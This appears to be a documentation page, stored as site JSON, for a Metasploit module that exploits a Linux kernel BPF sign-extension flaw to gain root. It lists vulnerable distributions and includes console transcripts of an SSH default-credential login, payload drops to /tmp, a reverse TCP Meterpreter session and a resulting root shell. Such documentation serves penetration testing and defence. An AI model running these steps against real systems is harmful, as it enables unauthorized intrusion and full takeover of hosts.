{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/linux/local/bpf_sign_extension_priv_esc","result":{"data":{"moduleMetadataJson":{"id":"bea5a69b-8bbf-5237-929e-bbbfd5fbba99","name":"Linux BPF Sign Extension Local Privilege Escalation","fullname":"exploit/linux/local/bpf_sign_extension_priv_esc","description":"Linux kernel prior to 4.14.8 utilizes the Berkeley Packet Filter (BPF)\n        which contains a vulnerability where it may improperly perform sign\n        extension. This can be utilized to escalate privileges.\n\n        The target system must be compiled with BPF support and must not have\n        kernel.unprivileged_bpf_disabled set to 1.\n\n        This module has been tested successfully on:\n\n        Debian 9.0 kernel 4.9.0-3-amd64;\n        Deepin 15.5 kernel 4.9.0-deepin13-amd64;\n        ElementaryOS 0.4.1 kernel 4.8.0-52-generic;\n        Fedora 25 kernel 4.8.6-300.fc25.x86_64;\n        Fedora 26 kernel 4.11.8-300.fc26.x86_64;\n        Fedora 27 kernel 4.13.9-300.fc27.x86_64;\n        Gentoo 2.2 kernel 4.5.2-aufs-r;\n        Linux Mint 17.3 kernel 4.4.0-89-generic;\n        Linux Mint 18.0 kernel 4.8.0-58-generic;\n        Linux Mint 18.3 kernel 4.13.0-16-generic;\n        Mageia 6 kernel 4.9.35-desktop-1.mga6;\n        Manjero 16.10 kernel 4.4.28-2-MANJARO;\n        Solus 3 kernel 4.12.7-11.current;\n        Ubuntu 14.04.1 kernel 4.4.0-89-generic;\n        Ubuntu 16.04.2 kernel 4.8.0-45-generic;\n        Ubuntu 16.04.3 kernel 4.10.0-28-generic;\n        Ubuntu 17.04 kernel 4.10.0-19-generic;\n        ZorinOS 12.1 kernel 4.8.0-39-generic.","rank":500,"fields":{"detailsSlug":"/modules/details/exploit/linux/local/bpf_sign_extension_priv_esc","documentationSlug":"/modules/documentation/exploit/linux/local/bpf_sign_extension_priv_esc","referencesSlug":"/modules/references/exploit/linux/local/bpf_sign_extension_priv_esc"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>  Linux kernel prior to 4.14.8 utilizes the Berkeley Packet Filter (BPF)\nwhich contains a vulnerability where it may improperly perform sign\nextension. This can be utilized to escalate privileges.</p>\n<p>  The target system must be compiled with BPF support and must not have\n<code class=\"language-text\">kernel.unprivileged_bpf_disabled</code> set to <code class=\"language-text\">1</code>.</p>\n<p>  This module has been tested successfully on:</p>\n<ul>\n<li>Debian 9.0 kernel 4.9.0-3-amd64;</li>\n<li>Deepin 15.5 kernel 4.9.0-deepin13-amd64;</li>\n<li>ElementaryOS 0.4.1 kernel 4.8.0-52-generic;</li>\n<li>Fedora 25 kernel 4.8.6-300.fc25.x86_64;</li>\n<li>Fedora 26 kernel 4.11.8-300.fc26.x86_64;</li>\n<li>Fedora 27 kernel 4.13.9-300.fc27.x86_64;</li>\n<li>Gentoo 2.2 kernel 4.5.2-aufs-r1;</li>\n<li>Linux Mint 17.3 kernel 4.4.0-89-generic;</li>\n<li>Linux Mint 18.0 kernel 4.8.0-58-generic;</li>\n<li>Linux Mint 18.3 kernel 4.13.0-16-generic;</li>\n<li>Mageia 6 kernel 4.9.35-desktop-1.mga6;</li>\n<li>Manjero 16.10 kernel 4.4.28-2-MANJARO;</li>\n<li>Solus 3 kernel 4.12.7-11.current;</li>\n<li>Ubuntu 14.04.1 kernel 4.4.0-89-generic;</li>\n<li>Ubuntu 16.04.2 kernel 4.8.0-45-generic;</li>\n<li>Ubuntu 16.04.3 kernel 4.10.0-28-generic;</li>\n<li>Ubuntu 16.04.5 kernel 4.4.0-116-generic;</li>\n<li>Ubuntu 17.04 kernel 4.10.0-19-generic;</li>\n<li>ZorinOS 12.1 kernel 4.8.0-39-generic.</li>\n</ul>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Start msfconsole</li>\n<li>Exploit a box via whatever method</li>\n<li>Do: <code class=\"language-text\">use exploit/linux/local/bpf_sign_extension_priv_esc</code></li>\n<li>Do: <code class=\"language-text\">set session #</code></li>\n<li>Do: <code class=\"language-text\">set verbose true</code></li>\n<li>Do: <code class=\"language-text\">exploit</code></li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p>  <strong>WritableDir</strong></p>\n<p>  A folder we can write files to.  Defaults to <code class=\"language-text\">/tmp</code></p>\n<p>  <strong>COMPILE</strong></p>\n<p>  If we should live compile on the system, or drop pre-created binaries.  Auto will determine if gcc/libs are installed to compile live on the system.  Defaults to <code class=\"language-text\">Auto</code></p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"ubuntu-1604-with-linux-440-116-generic\" style=\"position:relative;\"><a href=\"#ubuntu-1604-with-linux-440-116-generic\" aria-label=\"ubuntu 1604 with linux 440 116 generic permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Ubuntu 16.04 (with Linux 4.4.0-116-generic)</h3>\n<h4 id=\"initial-access\" style=\"position:relative;\"><a href=\"#initial-access\" aria-label=\"initial access permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Initial Access</h4>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">resource (ubuntu.rb)&gt; use auxiliary/scanner/ssh/ssh_login\nresource (ubuntu.rb)&gt; set rhosts 2.2.2.2\nrhosts =&gt; 2.2.2.2\nresource (ubuntu.rb)&gt; set username ubuntu\nusername =&gt; ubuntu\nresource (ubuntu.rb)&gt; set password ubuntu\npassword =&gt; ubuntu\nresource (ubuntu.rb)&gt; exploit\n[+] 2.2.2.2:22 - Success: &#39;ubuntu:ubuntu&#39; &#39;uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare) Linux ubuntu 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux &#39;\n[*] Command shell session 1 opened (1.1.1.1:36273 -&gt; 2.2.2.2:22) at 2018-03-23 20:42:04 -0400\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h4 id=\"escalate\" style=\"position:relative;\"><a href=\"#escalate\" aria-label=\"escalate permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Escalate</h4>\n<p>In this scenario, gcc is installed so we can live compile on the system.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">resource (ubuntu.rb)&gt; use exploit/linux/local/bpf_sign_extension_priv_esc\nresource (ubuntu.rb)&gt; set verbose true\nverbose =&gt; true\nresource (ubuntu.rb)&gt; set session 1\nsession =&gt; 1\nresource (ubuntu.rb)&gt; set lhost 1.1.1.1\nlhost =&gt; 1.1.1.1\nresource (ubuntu.rb)&gt; exploit\n[!] SESSION may not be compatible with this module.\n[*] Started reverse TCP handler on 1.1.1.1:4444 \n[+] Kernel confirmed vulnerable\n[+] gcc is installed\n[*] Live compiling exploit on system\n[*] Writing files to target\n[*] Writing vQIIRofN to /tmp/vQIIRofN.c\n[*] Max line length is 65537\n[*] Writing 7797 bytes in 1 chunks of 26837 bytes (octal-encoded), using printf\n[*] Writing iuRJiXBf to /tmp/iuRJiXBf\n[*] Max line length is 65537\n[*] Writing 283 bytes in 1 chunks of 844 bytes (octal-encoded), using printf\n[*] Starting execution of priv esc.\n[*] Transmitting intermediate stager...(126 bytes)\n[*] Sending stage (812100 bytes) to 2.2.2.2\n[*] task_struct = ffff88003869aa00\n[*] uidptr = ffff8800354fb244\n[*] spawning root shell\n[*] Sleeping before handling stage...\n[+] Deleted /tmp/vQIIRofN.c\n[+] Deleted /tmp/vQIIRofN\n[+] Deleted /tmp/iuRJiXBf\n\nmeterpreter &gt; sysinfo\nComputer     : 2.2.2.2\nOS           : Ubuntu 16.04 (Linux 4.4.0-116-generic)\nArchitecture : x64\nBuildTuple   : x86_64-linux-musl\nMeterpreter  : x64/linux\nmeterpreter &gt; getuid\nServer username: uid=0, gid=0, euid=0, egid=0</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h4 id=\"escalate-w-pre-compiled-binaries\" style=\"position:relative;\"><a href=\"#escalate-w-pre-compiled-binaries\" aria-label=\"escalate w pre compiled binaries permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Escalate w/ pre-compiled binaries</h4>\n<p>It is possible to force pre-compiled binaries, in a scenario where <code class=\"language-text\">build-essential</code> or <code class=\"language-text\">gcc</code> aren't on the system.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">resource (ubuntu.rb)&gt; use exploit/linux/local/bpf_sign_extension_priv_esc\nresource (ubuntu.rb)&gt; set verbose true\nverbose =&gt; true\nresource (ubuntu.rb)&gt; set session 1\nsession =&gt; 1\nresource (ubuntu.rb)&gt; set lhost 1.1.1.1\nlhost =&gt; 1.1.1.1\nresource (ubuntu.rb)&gt; exploit\n[!] SESSION may not be compatible with this module.\n[*] Started reverse TCP handler on 1.1.1.1:4444 \n[+] Kernel confirmed vulnerable\n[-] gcc is not installed.  Compiling will fail.\n[*] Dropping pre-compiled exploit on system\n[*] Writing vsQTwocG to /tmp/vsQTwocG\n[*] Max line length is 65537\n[*] Writing 14040 bytes in 1 chunks of 36802 bytes (octal-encoded), using printf\n[*] Writing JDQDHtEG to /tmp/JDQDHtEG\n[*] Max line length is 65537\n[*] Writing 283 bytes in 1 chunks of 844 bytes (octal-encoded), using printf\n[*] Starting execution of priv esc.\n[*] Transmitting intermediate stager...(126 bytes)\n[*] Sending stage (812100 bytes) to 2.2.2.2\n[*] task_struct = ffff88003a8a3800\n[*] uidptr = ffff88003d276304\n[*] spawning root shell\n[*] Sleeping before handling stage...\n[+] Deleted /tmp/vsQTwocG\n[+] Deleted /tmp/JDQDHtEG\n\nmeterpreter &gt; getuid\nServer username: uid=0, gid=0, euid=0, egid=0\nmeterpreter &gt; sysinfo\nComputer     : 2.2.2.2\nOS           : Ubuntu 16.04 (Linux 4.4.0-116-generic)\nArchitecture : x64\nBuildTuple   : x86_64-linux-musl\nMeterpreter  : x64/linux</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"debian-90-x86_64\" style=\"position:relative;\"><a href=\"#debian-90-x86_64\" aria-label=\"debian 90 x86_64 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Debian 9.0 (x86_64)</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use exploit/linux/local/bpf_sign_extension_priv_esc \nmsf5 exploit(linux/local/bpf_sign_extension_priv_esc) &gt; set session 1\nsession =&gt; 1\nmsf5 exploit(linux/local/bpf_sign_extension_priv_esc) &gt; set compile False\ncompile =&gt; False\nmsf5 exploit(linux/local/bpf_sign_extension_priv_esc) &gt; run\n\n[*] Started reverse TCP handler on 172.16.191.188:4444 \n[*] Writing &#39;/tmp/.JBJBxoEO&#39; (34784 bytes) ...\n[*] Writing &#39;/tmp/.1pZhL1gc&#39; (207 bytes) ...\n[*] Launching exploit ...\n[*] Sending stage (861480 bytes) to 172.16.191.236\n[*] Cleaning up /tmp/.1pZhL1gc and /tmp/.JBJBxoEO ...\n\nmeterpreter &gt; getuid\nServer username: uid=0, gid=0, euid=0, egid=0\nmeterpreter &gt; sysinfo\nComputer     : debian-9-0-x64.local\nOS           : Debian 9.4 (Linux 4.9.0-3-amd64)\nArchitecture : x64\nBuildTuple   : i486-linux-musl\nMeterpreter  : x86/linux\nmeterpreter &gt; </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"bea5a69b-8bbf-5237-929e-bbbfd5fbba99"}}}